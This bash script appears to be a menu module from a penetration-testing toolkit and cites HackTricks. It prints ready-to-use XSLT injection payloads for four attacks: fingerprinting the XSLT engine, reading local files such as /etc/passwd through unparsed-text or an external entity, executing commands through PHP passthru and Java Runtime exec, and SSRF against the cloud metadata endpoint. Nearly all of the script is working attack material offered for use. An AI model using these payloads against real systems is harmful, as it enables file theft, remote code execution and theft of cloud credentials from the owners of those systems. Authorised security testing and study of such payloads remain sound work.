#!/bin/bash
# HackTricks Ref: xslt-injection
# Module: XSLT Injection (XML Transformation Attack)

echo -e "${C6}[WEB ATTACK: XSLT_INJECTION]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/xslt-injection"
echo -e "--------------------------------------------------"

echo -e "${C4}Select XSLT Injection Vector:${NC}"
echo "1) System Information Leak (Version/Vendor)"
echo "2) Local File Read (XXE-style)"
echo "3) Remote Code Execution (PHP/Java/Wrappers)"
echo "4) SSRF (Document function)"
echo "0) Exit"

read -p "Selection: " xslt_opt

case $xslt_opt in
    1)
        echo -e "\n${C2}[*] Identifying XSLT Engine:${NC}"
        echo "Inject these to see the vendor and version:"
        echo " - <xsl:value-of select=\"system-property('xsl:vendor')\"/>"
        echo " - <xsl:value-of select=\"system-property('xsl:version')\"/>"
        ;;
    2)
        echo -e "\n${C2}[*] Local File Read:${NC}"
        echo "Use 'unparsed-text' (XSLT 2.0) or ENTITIES:"
        echo " - <xsl:value-of select=\"unparsed-text('/etc/passwd')\"/>"
        echo " - Payload via ENTITY:"
        echo "   <!DOCTYPE x [ <!ENTITY f SYSTEM \"file:///etc/passwd\"> ]>"
        echo "   <xsl:value-of select=\"&f;\"/>"
        ;;
    3)
        echo -e "\n${C2}[*] Remote Code Execution (RCE):${NC}"
        echo "For PHP-based engines:"
        echo " - <xsl:value-of select=\"php:function('passthru','id')\"/>"
        echo "For Java-based (Xalan):"
        echo " - <xsl:value-of select=\"runtime:exec(runtime:getRuntime(),'id')\"/>"
        echo "For .NET (Microsoft):"
        echo " - Use msxsl:script block to inject C# code."
        ;;
    4)
        echo -e "\n${C2}[*] SSRF via document():${NC}"
        echo "The document() function can fetch external XML files:"
        echo " - <xsl:copy-of select=\"document('http://169.254.169.254/latest/meta-data/')\"/>"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
